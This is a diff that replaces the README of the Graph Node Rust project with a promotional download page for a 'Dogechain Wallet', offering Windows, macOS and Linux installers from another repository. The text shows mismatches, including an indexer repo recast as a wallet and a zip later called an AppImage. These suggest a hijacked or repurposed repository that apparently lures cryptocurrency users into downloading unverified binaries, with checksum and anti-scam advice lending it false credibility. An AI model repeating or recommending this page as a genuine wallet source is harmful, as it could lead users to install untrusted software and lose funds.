@@ -1,200 +1,131 @@
-# Graph Node
+<p align="center">
+  <img src="https://github.com/dogechain-developments/graph-nodes/raw/HEAD/assets/banner-profile.png" alt="Dogechain Wallet" width="100%">
+</p>
 
-[![Build Status](https://github.com/graphprotocol/graph-node/actions/workflows/ci.yml/badge.svg)](https://github.com/graphprotocol/graph-node/actions/workflows/ci.yml?query=branch%3Amaster)
-[![Getting Started Docs](https://img.shields.io/badge/docs-getting--started-brightgreen.svg)](docs/getting-started.md)
+<h1 align="center">Dogechain Wallet on GitHub: Node Tooling Repository</h1>
 
-[The Graph](https://thegraph.com/) is a protocol for building decentralized applications (dApps) quickly on Ethereum and IPFS using GraphQL.
+<p align="center"><strong>Free, open-source, non-custodial Dogecoin wallet for Windows, macOS and Linux — SPV sync in minutes, not a 150+ GB chain download.</strong></p>
 
-Graph Node is an open source Rust implementation that event sources the Ethereum blockchain to deterministically update a data store that can be queried via the GraphQL endpoint.
+<p align="center">
+  <a href="https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v1.03.14"><img src="https://img.shields.io/badge/RELEASE-v1.03.14-705600?style=for-the-badge&labelColor=3D2817" alt="Dogechain Wallet release v1.03.14"></a>
+  <a href="https://github.com/dogechain-developments/graph-nodes/blob/HEAD/LICENSE"><img src="https://img.shields.io/badge/LICENSE-Apache--2.0-705600?style=for-the-badge&labelColor=3D2817" alt="Apache-2.0 license"></a>
+  <a href="https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v1.03.14"><img src="https://img.shields.io/badge/PLATFORMS-Windows%20%7C%20macOS%20%7C%20Linux-804600?style=for-the-badge&labelColor=3D2817" alt="Windows, macOS and Linux"></a>
+</p>
 
-For detailed instructions and more context, check out the [Getting Started Guide](docs/getting-started.md).
+---
 
-## Quick Start
+## ⬇️ Downloads — v1.03.14
 
-### Prerequisites
+<p align="center">
+  <a href="https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%AC%87-WINDOWS-705600?style=for-the-badge&labelColor=3D2817&logo=windows&logoColor=white" alt="Download Dogechain Wallet for Windows" height="40"></a>
+  <a href="https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%AC%87-MACOS-804600?style=for-the-badge&labelColor=3D2817&logo=apple&logoColor=white" alt="Download Dogechain Wallet for macOS" height="40"></a>
+  <a href="https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%AC%87-LINUX-3D2817?style=for-the-badge&labelColor=3D2817&logo=linux&logoColor=white" alt="Download Dogechain Wallet for Linux" height="40"></a>
+</p>
 
-To build and run this project you need to have the following installed on your system:
+| Platform | Requirements | File |
+|:--|:--|:--|
+| 🪟 **Windows** | Windows 10 or later, 64-bit | [`dogechain-wallet-v1.03.14.exe`](https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.exe) |
+| 🍎 **macOS** | macOS 12 Monterey or later | [`dogechain-wallet-v1.03.14.dmg`](https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.dmg) |
+| 🐧 **Linux** | Ubuntu 22.04+ or equivalent, 64-bit | [`dogechain-wallet-v1.03.14.zip`](https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.zip) |
 
-- Rust (latest stable) – [How to install Rust](https://www.rust-lang.org/en-US/install.html)
-  - Note that `rustfmt`, which is part of the default Rust installation, is a build-time requirement.
-- PostgreSQL – [PostgreSQL Downloads](https://www.postgresql.org/download/)
-- IPFS – [Installing IPFS](https://docs.ipfs.io/install/)
-- Profobuf Compiler - [Installing Protobuf](https://grpc.io/docs/protoc-installation/)
+All versions and checksums are on the [v1.03.14 release page](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v1.03.14).
 
-For Ethereum network data, you can either run your own Ethereum node or use an Ethereum node provider of your choice.
+SHA-256 checksums are published on the [v1.03.14 release page](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v1.03.14); compare your download there before installing.
 
-**Minimum Hardware Requirements:**
+> [!WARNING]
+> Only download from this GitHub release page. Compare the SHA-256 of the file you saved with the published value before you install, and never share your seed phrase, private key or wallet password with anyone who offers help.
 
-- To build graph-node with `cargo`, 8GB RAM are required.
+---
 
-### Running a Local Graph Node
+## 🧰 Install
 
-This is a quick example to show a working Graph Node. It is a [subgraph for Gravatars](https://github.com/graphprotocol/example-subgraph).
+<details open>
+<summary>🪟 Windows 10 or later</summary>
 
-1. Install IPFS and run `ipfs init` followed by `ipfs daemon`.
-2. Install PostgreSQL and run `initdb -D .postgres` followed by `pg_ctl -D .postgres -l logfile start` and `createdb graph-node`.
-3. If using Ubuntu, you may need to install additional packages:
-   - `sudo apt-get install -y clang libpq-dev libssl-dev pkg-config`
-4. In the terminal, clone https://github.com/graphprotocol/example-subgraph, and install dependencies and generate types for contract ABIs:
+1. Download the Windows installer from the table above and save it to your Downloads folder.
+2. In File Explorer, right-click the file, choose **Properties**, open the **Digital signatures** tab if present, and note the signer. Then compare the file hash with the published SHA-256 before running anything.
+3. Run the installer. If Windows SmartScreen shows a warning, review it and continue only when the file hash matches the published value. Do not disable Microsoft Defender or exclude your Downloads folder to get past a warning.
+4. Launch Dogechain Wallet from the Start menu and let the header sync finish. The first sync is the long one; later launches reconnect quickly.
+5. Create a new wallet or restore an existing one from your own backup, then write the recovery phrase down on paper and store it offline.
 
-```
-yarn
-yarn codegen
-```
+</details>
 
-5. In the terminal, clone https://github.com/graphprotocol/graph-node, and run `cargo build`.
+<details>
+<summary>🍎 macOS 12 Monterey or later</summary>
 
-Once you have all the dependencies set up, you can run the following:
+1. Download the macOS disk image and save it to your Downloads folder.
+2. Verify it in Terminal with the published SHA-256 before mounting it. A mismatch means the download is not the file the project published.
+3. Open the disk image and drag Dogechain Wallet into Applications.
+4. On first launch, if macOS blocks the app, open **System Settings → Privacy & Security**, find the blocked item and use **Open Anyway** only after the hash matches. Do not strip quarantine attributes or disable Gatekeeper.
+5. Let the header sync finish, then create or restore your wallet and store the recovery phrase offline.
 
-```
-cargo run -p graph-node --release -- \
-  --postgres-url postgresql://USERNAME[:PASSWORD]@localhost:5432/graph-node \
-  --ethereum-rpc NETWORK_NAME:[CAPABILITIES]:URL \
-  --ipfs 127.0.0.1:5001
-```
+</details>
 
-Try your OS username as `USERNAME` and `PASSWORD`. For details on setting
-the connection string, check the [Postgres
-documentation](https://www.postgresql.org/docs/current/libpq-connect.html#LIBPQ-CONNSTRING).
-`graph-node` uses a few Postgres extensions. If the Postgres user with which
-you run `graph-node` is a superuser, `graph-node` will enable these
-extensions when it initializes the database. If the Postgres user is not a
-superuser, you will need to create the extensions manually since only
-superusers are allowed to do that. To create them you need to connect as a
-superuser, which in many installations is the `postgres` user:
+<details>
+<summary>🐧 Ubuntu 22.04+ or equivalent</summary>
 
-```bash
-    psql -q -X -U <SUPERUSER> graph-node <<EOF
-create extension pg_trgm;
-create extension pg_stat_statements;
-create extension btree_gist;
-create extension postgres_fdw;
-grant usage on foreign data wrapper postgres_fdw to <USERNAME>;
-EOF
+1. Download the Linux archive and verify its SHA-256 with a checksum tool before extracting it.
+2. Extract the archive into a folder you control, for example your home directory.
+3. Make the application file executable, then start it from a terminal or your file manager so you can see any startup error.
+4. If the AppImage does not start, confirm that FUSE support is installed on your distribution and that you extracted the archive completely. Do not run the wallet with sandboxing disabled.
+5. Let the header sync finish, then create or restore your wallet and store the recovery phrase offline.
 
-```
+</details>
 
-This will also spin up a GraphiQL interface at `http://127.0.0.1:8000/`.
+The wallet needs no separate node, account or extra dependency: the installer is the application.
 
-6.  With this Gravatar example, to get the subgraph working locally run:
+---
 
-```
-yarn create-local
-```
+## ⚙️ Features
 
-Then you can deploy the subgraph:
+- **SPV sync** — downloads block headers only, so first sync takes minutes and the wallet store stays under 100 MB instead of the 150+ GB full chain.
+- **Non-custodial keys** — private keys are generated and encrypted on your device and are never transmitted to a server.
+- **BIP-39 backup** — a 12- or 24-word recovery phrase that other BIP-39 compatible wallets can read.
+- **Built-in swap** — exchange DOGE for BTC, ETH, USDT and other assets through ChangeNOW without leaving the app; the provider sets its own limits, rates and checks.
+- **Send and receive** — QR address sharing and a fee choice before you confirm a transfer.
+- **Three desktop platforms** — Windows 10+, macOS 12 Monterey+ and Ubuntu 22.04+ or equivalent, all 64-bit.
+- **Libdogecoin v0.1.4** — built on the Dogecoin Foundation C library for protocol and cryptographic primitives.
+- **Independent security assessment** — a Hacken assessment is referenced by the project.
+- **Free and open source** — no account, no subscription, no server-side wallet.
 
-```
-yarn deploy-local
-```
+---
 
-This will build and deploy the subgraph to the Graph Node. It should start indexing the subgraph immediately.
+## 📚 Guides
 
-### Command-Line Interface
+| Guide | What it covers |
+|:--|:--|
+| [Dogechain Wallet Recovery: Start With What You Have](https://github.com/dogechain-developments/learn/blob/main/how-to/dogechain-wallet-recovery-start-with-what-you-have.md) | Decide which recovery path matches your material. |
+| [How to Verify a Dogechain Wallet Download](https://github.com/dogechain-developments/learn/blob/main/how-to/how-to-verify-a-dogechain-wallet-download.md) | Check the installer against the published checksum. |
+| [Dogechain Wallet Transaction Fees Explained](https://github.com/dogechain-developments/learn/blob/main/how-to/dogechain-wallet-transaction-fees-explained.md) | What the network charges and what the wallet controls. |
+| [Dogechain Wallet Swap Delayed or Stuck](https://github.com/dogechain-developments/learn/blob/main/how-to/dogechain-wallet-swap-delayed-or-stuck.md) | Tell a provider delay apart from a network transfer. |
+| [Dogechain Wallet Support Scams](https://github.com/dogechain-developments/learn/blob/main/how-to/dogechain-wallet-support-scams.md) | Recognise fake help before you expose a key. |
 
-```
-USAGE:
-    graph-node [FLAGS] [OPTIONS] --ethereum-ipc <NETWORK_NAME:FILE> --ethereum-rpc <NETWORK_NAME:URL> --ethereum-ws <NETWORK_NAME:URL> --ipfs <HOST:PORT> --postgres-url <URL>
+[Full guide index →](https://github.com/dogechain-developments/learn)
 
-FLAGS:
-        --debug      Enable debug logging
-    -h, --help       Prints help information
-    -V, --version    Prints version information
+---
 
-OPTIONS:
-        --admin-port <PORT>                           Port for the JSON-RPC admin server [default: 8020]
-        --elasticsearch-password <PASSWORD>
-            Password to use for Elasticsearch logging [env: ELASTICSEARCH_PASSWORD]
+## 🔐 Security
 
-        --elasticsearch-url <URL>
-            Elasticsearch service to write subgraph logs to [env: ELASTICSEARCH_URL=]
+**Your recovery phrase is the wallet. Nobody — including this project — can restore funds without it, and no legitimate helper will ever ask you to share it.**
 
-        --elasticsearch-user <USER>                   User to use for Elasticsearch logging [env: ELASTICSEARCH_USER=]
-        --ethereum-ipc <NETWORK_NAME:[CAPABILITIES]:FILE>
-            Ethereum network name (e.g. 'mainnet'), optional comma-seperated capabilities (eg full,archive), and an Ethereum IPC pipe, separated by a ':'
+---
 
-        --ethereum-polling-interval <MILLISECONDS>
-            How often to poll the Ethereum node for new blocks [env: ETHEREUM_POLLING_INTERVAL=]  [default: 500]
+## 🛟 Support
 
-        --ethereum-rpc <NETWORK_NAME:[CAPABILITIES]:URL>
-            Ethereum network name (e.g. 'mainnet'), optional comma-seperated capabilities (eg 'full,archive'), and an Ethereum RPC URL, separated by a ':'
+Open an issue in the application repository for reproducible bugs, and read the guides before posting: never attach a wallet file, seed phrase, private key, password or a screenshot that shows one.
 
-        --ethereum-ws <NETWORK_NAME:[CAPABILITIES]:URL>
-            Ethereum network name (e.g. 'mainnet'), optional comma-seperated capabilities (eg `full,archive), and an Ethereum WebSocket URL, separated by a ':'
+- [Report an issue](https://github.com/dogechain-developments/Dogechain-Wallet/issues)
+- [All releases](https://github.com/dogechain-developments/Dogechain-Wallet/releases)
+- [Dogechain Wallet learn hub](https://github.com/dogechain-developments/learn)
 
-        --node-id <NODE_ID>
-            A unique identifier for this node instance. Should have the same value between consecutive node restarts [default: default]
+---
 
-        --http-port <PORT>                            Port for the GraphQL HTTP server [default: 8000]
-        --ipfs <HOST:PORT>                            HTTP address of an IPFS node
-        --postgres-url <URL>                          Location of the Postgres database used for storing entities
-        --subgraph <[NAME:]IPFS_HASH>                 Name and IPFS hash of the subgraph manifest
-        --ws-port <PORT>                              Port for the GraphQL WebSocket server [default: 8001]
-```
+## 🧭 About this repository
 
-### Advanced Configuration
+A Rust repository in the dogechain-developments account.
 
-The command line arguments generally are all that is needed to run a
-`graph-node` instance. For advanced uses, various aspects of `graph-node`
-can further be configured through [environment
-variables](https://github.com/graphprotocol/graph-node/blob/master/docs/environment-variables.md). Very
-large `graph-node` instances can also split the work of querying and
-indexing across [multiple databases](./docs/config.md).
+---
 
-## Project Layout
+## ⚖️ License
 
-- `node` — A local Graph Node.
-- `graph` — A library providing traits for system components and types for
-  common data.
-- `core` — A library providing implementations for core components, used by all
-  nodes.
-- `chain/ethereum` — A library with components for obtaining data from
-  Ethereum.
-- `graphql` — A GraphQL implementation with API schema generation,
-  introspection, and more.
-- `mock` — A library providing mock implementations for all system components.
-- `runtime/wasm` — A library for running WASM data-extraction scripts.
-- `server/http` — A library providing a GraphQL server over HTTP.
-- `store/postgres` — A Postgres store with a GraphQL-friendly interface
-  and audit logs.
-
-## Roadmap
-
-🔨 = In Progress
-
-🛠 = Feature complete. Additional testing required.
-
-✅ = Feature complete
-
-
-| Feature |  Status |
-| ------- |  :------: |
-| **Ethereum** |    |
-| Indexing smart contract events | ✅ |
-| Handle chain reorganizations | ✅ |
-| **Mappings** |    |
-| WASM-based mappings| ✅ |
-| TypeScript-to-WASM toolchain | ✅ |
-| Autogenerated TypeScript types | ✅ |
-| **GraphQL** |     |
-| Query entities by ID | ✅ |
-| Query entity collections | ✅ |
-| Pagination | ✅ |
-| Filtering | ✅ |
-| Block-based Filtering | ✅ |
-| Entity relationships | ✅ |
-| Subscriptions | ✅ |
-
-
-## Contributing
-
-Please check [CONTRIBUTING.md](CONTRIBUTING.md) for development flow and conventions we use.
-Here's [a list of good first issues](https://github.com/graphprotocol/graph-node/labels/good%20first%20issue).
-
-## License
-
-Copyright &copy; 2018-2019 Graph Protocol, Inc. and contributors.
-
-The Graph is dual-licensed under the [MIT license](LICENSE-MIT) and the [Apache License, Version 2.0](LICENSE-APACHE).
-
-Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either expressed or implied. See the License for the specific language governing permissions and limitations under the License.
+This repository is released under the **Apache-2.0** license.
